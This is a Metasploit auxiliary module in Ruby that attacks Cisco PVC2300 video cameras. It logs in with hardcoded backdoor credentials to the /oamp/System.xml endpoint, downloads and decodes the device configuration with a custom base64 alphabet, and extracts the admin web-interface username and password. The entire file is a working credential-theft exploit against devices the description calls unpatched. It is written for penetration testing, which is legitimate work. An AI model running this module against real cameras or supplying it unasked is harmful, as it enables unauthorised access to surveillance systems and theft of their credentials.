##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        {
          'Name' => 'Cisco PVC2300 POE Video Camera configuration download',
          'Description' => %q{
            This module exploits an information disclosure vulnerability in Cisco PVC2300 cameras in order
            to download the configuration file containing the admin credentials for the web interface.

            The module first performs a basic check to see if the target is likely Cisco PVC2300. If so, the
            module attempts to obtain a sessionID via an HTTP GET request to the vulnerable /oamp/System.xml
            endpoint using hardcoded credentials.

            If a session ID is obtained, the module uses it in another HTTP GET request to /oamp/System.xml
            with the aim of downloading the configuration file. The configuration file, if obtained, is then
            decoded and saved to the loot directory. Finally, the module attempts to extract the admin
            credentials to the web interface from the decoded configuration file.

            No known solution was made available for this vulnerability and no CVE has been published. It is
            therefore likely that most (if not all) Cisco PVC2300 cameras are affected.

            This module was successfully tested against several Cisco PVC2300 cameras.
          },
          'License' => MSF_LICENSE,
          'Author' => [
            'Craig Heffner', # vulnerability discovery and PoC
            'Erik Wynter', # @wyntererik - Metasploit
          ],
          'References' => [
            [ 'URL', 'https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf' ], # blackhat presentation - unofficial source
            [ 'URL', 'https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf'], # blackhat presentation - official source (not working)
            [ 'URL', 'https://www.youtube.com/watch?v=B8DjTcANBx0'] # full blackhat presentation
          ],
          'DisclosureDate' => '2013-07-12',
          'Notes' => {
            'Stability' => [CRASH_SAFE],
            'Reliability' => [REPEATABLE_SESSION], # the attack can be repeated, but a timeout of several minutes may be necessary between exploit attempts
            'SideEffects' => [IOC_IN_LOGS]
          }
        }
      )
    )
  end

  def custom_base64_alphabet
    'ACEGIKMOQSUWYBDFHJLNPRTVXZacegikmoqsuwybdfhjlnprtvxz0246813579=+'
  end

  def default_base64_alphabet
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  end

  def request_session_id
    vprint_status('Attempting to obtain a session ID')
    # the creds used here are basically a backdoor
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'oamp', 'System.xml'),
      'vars_get' => {
        'action' => 'login',
        'user' => 'L1_admin',
        'password' => 'L1_51'
      }
    })

    unless res
      fail_with(Failure::Unknown, 'Connection failed when trying to obtain a session ID')
    end

    unless res.code == 200
      fail_with(Failure::NotVulnerable, "Received unexpected response code #{res.code} while trying to obtain a session ID.")
    end

    if res.headers.include?('sessionID') && !res.headers['sessionID'].blank?
      session_id = res.headers['sessionID']
      print_status("The target may be vulnerable. Obtained sessionID #{session_id}")
      return session_id
    end

    # try to check the status message in the response body
    # the status may indicate if the target is perhaps only temporarily unavailable, which was encountered when testing the module repeatedly
    status = res.body.scan(%r{<statusString>(.*?)</statusString>})&.flatten&.first&.strip
    if status.blank?
      fail_with(Failure::NotVulnerable, 'Failed to obtain a session ID.')
    end

    if status == 'try it later'
      fail_with(Failure::Unknown, "Failed to obtain a session ID. The server responded with status: #{status}. The target may still be vulnerable.")
    else
      fail_with(Failure::NotVulnerable, "Failed to obtain a session ID. The server responded with status: #{status}")
    end
  end

  def download_config_file(session_id)
    vprint_status('Attempting to download the configuration file')

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'oamp', 'System.xml'),
      'headers' => {
        'sessionID' => session_id
      },
      'vars_get' => {
        'action' => 'downloadConfigurationFile'
      }
    })

    unless res
      fail_with(Failure::Unknown, 'Connection failed when trying to download the configuration file')
    end

    unless res.code == 200 && !res.body.empty?
      fail_with(Failure::NotVulnerable, 'Failed to obtain the configuration file')
    end

    # if the exploit doesn't work, the response body should be empty. So if we have anything, we can assume we're in business
    res.body
  end

  def decode_config_file(config_file_encoded)
    # if we've made it all the way here, this shouldn't break, but better safe than sorry
    begin
      config_file_base64 = config_file_encoded.tr(custom_base64_alphabet, default_base64_alphabet)
      config_file_decoded = Base64.decode64(config_file_base64)
    rescue StandardError => e
      print_error('Encountered the following error when attempting to decode the configuration file:')
      print_error(e)
      fail_with(Failure::Unknown, 'Failed to decode the configuration file')
    end

    # let's just save the full config at this point
    path = store_loot('ciscopvc.config', 'text/plain', rhost, config_file_decoded)
    print_good('Successfully downloaded the configuration file')
    print_status("Saving the full configuration file to #{path}")

    # let's see if we can grab the device name from the config file
    if config_file_decoded =~ /comment=.*? Video Camera/
      device_name = config_file_decoded.scan(/comment=(.*?)$/)&.flatten&.first&.strip
      unless device_name.blank?
        print_status("Obtained device name #{device_name}")
      end
    end

    # try to grab the admin username and password from the config file
    admin_name = nil
    admin_password = nil
    if config_file_decoded.include?('admin_name')
      admin_name = config_file_decoded.scan(/admin_name=(.*?)$/)&.flatten&.first&.strip
    end

    if config_file_decoded.include?('admin_password')
      admin_password = config_file_decoded.scan(/admin_password=(.*?)$/)&.flatten&.first&.strip
    end

    if admin_name.blank? && admin_password.blank?
      print_error('Failed to obtain the admin credentials from the configuration file')
    else
      print_good('Obtained the following admin credentials for the web interface from the configuration file:')
      print_status("admin username: #{admin_name}")
      print_status("admin password: #{admin_password}")
      # save the creds to the db
      report_creds(admin_name, admin_password)
    end
  end

  def report_creds(username, password)
    service_data = {
      address: datastore['RHOST'],
      port: datastore['RPORT'],
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: password,
      private_type: :password,
      username: username
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def check
    res1 = send_request_cgi('uri' => normalize_uri(target_uri.path))

    unless res1
      return Exploit::CheckCode::Unknown('Target is unreachable.')
    end

    # string togetether a few checks to make it more likely we're dealing with a Cisco camera
    unless res1.code == 401 && res1.headers.include?('WWW-Authenticate') && res1.headers['WWW-Authenticate'] == 'Basic realm="IP Camera"'
      return Exploit::CheckCode::Safe('Target is not a Cisco PVC2300 POE Video Camera')
    end

    res2 = send_request_cgi('uri' => normalize_uri(target_uri.path, 'oamp', 'System.xml'))
    unless res2
      return Exploit::CheckCode::Unknown('Target is unreachable.')
    end

    unless res2.code == 200 && res2.body =~ %r{<ActionStatus><statusCode>.*?</statusCode><statusString>.*?</statusString></ActionStatus>}
      return Exploit::CheckCode::Safe('Target is not a Cisco PVC2300 POE Video Camera')
    end

    vprint_status('Target seems to be a Cisco camera')
    Exploit::CheckCode::Appears
  end

  def run
    session_id = request_session_id
    config_file = download_config_file(session_id)
    decode_config_file(config_file)
  end
end
